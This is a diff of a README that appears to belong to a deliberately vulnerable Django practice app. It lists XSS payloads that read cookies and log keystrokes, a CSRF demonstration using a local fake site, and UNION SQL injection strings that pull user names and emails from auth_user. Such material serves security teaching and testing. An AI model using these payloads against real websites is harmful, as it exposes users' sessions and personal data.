@@ -22,24 +22,36 @@ users information such like cookies, passwords and affect the use of the website
 
 some xss code like:
 - steal cookies from logged-in users
-<code><script>alert(document.cookie.split('; ')[1]);</script></code>
+```html
+<script>alert(document.cookie.split('; ')[1]);</script>
+```
 - alert something to interference 
-<code><script>alert('You've been hacked');</script></code>
+```html
+<script>alert('You've been hacked');</script>
+```
 - Listen to the user's keyboard input
-<code><script>document.addEventListener('keypress', function (event) {console.log(event.key)})</script></code>
+```html
+<script>document.addEventListener('keypress', function (event) {console.log(event.key)})</script>
+```
 
 5. To CSRF
 To CSRF We need to open a fake website by http server use following bash code
-<code>python -m http.server 8080</code>
-
+```bash
+python -m http.server 8080
+```
+when you in the logged in the website, and Visit the `127.0.0.1:8080`. 
+You commented on something that was not manned by you
 
 6. To sql injection
 The home page have a search input which have risks of SQL injection,
 We can inject the database by some SQL code such like:
 - get django user list
-<code>z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '</code>
+```sql
+z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '
+```
 - get the email of django user 
-<code>z' UNION SELECT mail FROM auth_user WHERE first_name LIKE '</code>
+```sql
+z' UNION SELECT mail FROM auth_user WHERE first_name LIKE '
+```
 
-  
 Happy Hacking! :)
